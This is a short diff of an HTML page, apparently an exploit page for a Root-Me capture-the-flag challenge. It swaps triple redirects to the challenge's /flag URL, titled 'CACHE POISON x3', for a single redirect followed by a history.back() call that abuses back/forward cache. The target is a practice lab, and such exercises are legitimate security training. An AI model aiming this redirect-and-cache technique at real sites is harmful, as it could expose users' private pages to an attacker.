@@ -3,15 +3,24 @@
 <head>
   <meta charset="utf-8">
   <script>
+    let step = 0;
+    
     window.addEventListener('load', () => {
+      step = 1;
+      setTimeout(() => {
+        location.href = 'http://challenge01.root-me.org:58007/flag';
+      }, 300);
+    });
 
-      setTimeout(() => location.href = 'http://challenge01.root-me.org:58007/flag', 200);
-      setTimeout(() => location.href = 'http://challenge01.root-me.org:58007/flag', 600);
-      setTimeout(() => location.href = 'http://challenge01.root-me.org:58007/flag', 1000);
+    window.addEventListener('pageshow', () => {
+      if (step === 1) {
+        step = 2;
+        setTimeout(() => history.back(), 800);
+      }
     });
   </script>
 </head>
 <body style="background:black;color:lime;font-size:30px;">
-  <h1>CACHE POISON x3</h1>
+  <h1>BF → FLAG</h1>
 </body>
 </html>
